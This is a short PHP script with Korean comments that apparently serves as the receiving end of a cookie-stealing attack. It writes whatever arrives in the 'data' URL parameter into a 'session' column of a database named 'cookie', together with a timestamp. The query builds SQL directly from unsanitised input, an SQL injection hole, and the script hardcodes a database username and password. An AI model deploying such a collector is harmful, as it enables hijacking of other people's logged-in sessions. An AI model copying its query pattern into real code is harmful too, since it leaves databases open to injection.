<?php
$conn = mysqli_connect('localhost','sujine','zaxscd12za','cookie');

$sql = "
    INSERT INTO info (
      time,
      session
    ) VALUES (
      NOW(),
      '{$_GET['data']}'
        )"; //수행할 쿼리문
mysqli_query($conn, $sql); //쿼리를 데이터베이스에 작동되게

echo "hihi";
 ?>
